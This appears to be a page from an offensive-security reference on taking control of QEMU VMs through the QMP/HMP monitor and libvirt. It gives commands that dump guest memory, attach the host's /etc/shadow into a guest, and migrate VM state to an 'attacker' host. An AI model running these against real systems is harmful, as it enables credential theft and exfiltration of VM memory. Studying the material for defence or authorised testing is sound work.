---
title: "Management plane: controlling a QEMU VM through QMP, HMP, and libvirt"
order: 3
description: "A running QEMU exposes a monitor, the QEMU Machine Protocol (QMP) and the human monitor (HMP), that can read guest memory, attach devices and disks, migrate the VM, and run commands affecting the host. Reaching a monitor socket, or the libvirt API that fronts it, gives control over the VM and, through features like migration and disk attachment, over host resources."
keywords:
  - qmp
  - hmp
  - qemu monitor
  - libvirt
  - migration
---

# Management plane

A running QEMU process exposes a control interface, the QEMU Machine Protocol (QMP, JSON over a socket) and the Human Monitor (HMP), usually on a Unix socket managed by libvirt. The monitor is powerful by design: it can read and write guest memory, hot-plug devices and disks, take and load snapshots, change media, and migrate the VM to another host. Reaching a monitor socket, or the libvirt API that fronts it, is therefore control of the VM and a lever on host resources, because several monitor operations touch host files and network endpoints.

## Reach and drive the monitor

```bash
# libvirt-managed monitor sockets (host-side)
ls -l /var/lib/libvirt/qemu/domain-*/monitor.sock 2>/dev/null
# talk QMP: capabilities handshake, then commands
socat - UNIX-CONNECT:/var/lib/libvirt/qemu/domain-1-vm/monitor.sock
# {"execute":"qmp_capabilities"}
# {"execute":"human-monitor-command","arguments":{"command-line":"info registers"}}
# read guest memory, dump it, or attach a host disk/file to the guest:
# {"execute":"human-monitor-command","arguments":{"command-line":"pmemsave 0 0x100000 /tmp/g"}}
# via libvirt instead:
virsh qemu-monitor-command <dom> --hmp 'info block'
virsh attach-disk <dom> /etc/shadow vdz --config    # attach a host file into the guest
```

## Host-affecting operations

```bash
# migration can be directed to an attacker endpoint, exfiltrating VM state/memory
virsh migrate <dom> qemu+tcp://attacker/system      # VM state to attacker host
# blockdev/drive commands can open host files as guest disks; snapshot commands
# write to host paths; these turn monitor access into host file read/write
```

## Exploitation notes

- Monitor access is near-total control of the VM: `pmemsave`/`memsave` dump guest RAM (secrets, keys), and device/disk hot-plug plus media change manipulate what the guest and host expose to each other.
- Several operations reach the host: attaching a host file as a guest disk reads host files into the guest, migration sends VM state to a chosen endpoint, and snapshot/blockdev commands write host paths.
- The socket is typically gated by filesystem permissions under libvirt; reaching it usually means some host access already, but it then escalates control and can pivot via migration and disk attachment.
- libvirt's `virsh qemu-monitor-command` is the supported path to the same interface when you have libvirt access; see [Proxmox](../proxmox-ve/management-plane.md) and other products that layer their own API on top.

## References

- [QEMU QMP reference](https://www.qemu.org/docs/master/interop/qemu-qmp-ref.html)
- [libvirt API and virsh](https://libvirt.org/docs.html)
- [QEMU monitor documentation](https://www.qemu.org/docs/master/system/monitor.html)
